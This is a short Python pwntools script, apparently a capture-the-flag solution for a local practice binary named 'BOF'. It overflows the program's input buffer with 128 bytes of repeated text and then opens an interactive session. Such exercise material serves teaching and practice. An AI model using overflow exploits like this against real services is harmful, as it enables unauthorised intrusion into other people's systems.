#!/usr/bin/env python3

from pwn import *

exe = ELF("BOF")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9944)

    return r


def main():
    r = conn()

    r.sendline(b'Good Bye' * 16)

    r.interactive()

if __name__ == "__main__":
    main()
